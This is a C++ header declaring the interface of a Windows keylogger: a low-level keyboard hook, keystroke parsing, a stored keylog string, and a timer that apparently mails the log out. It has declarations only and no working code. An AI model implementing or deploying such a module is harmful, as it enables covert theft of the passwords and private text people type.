#ifndef KEYBOARDHOOK_H
#define KEYBOARDHOOK_H

#include <string>
#include <windows.h>

namespace KeyboardHook
{
    std::string GetKeylogString();

    void TimerSendMail();
    void TimedLog();
    
    LRESULT MyKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
    void ParseInput(WPARAM wParam, KBDLLHOOKSTRUCT *kbs);
    void VerboseParseInput(WPARAM wParam, KBDLLHOOKSTRUCT *kbs);

    bool InstallHook();
    bool UninstallHook();
    bool IsHooked();
}



#endif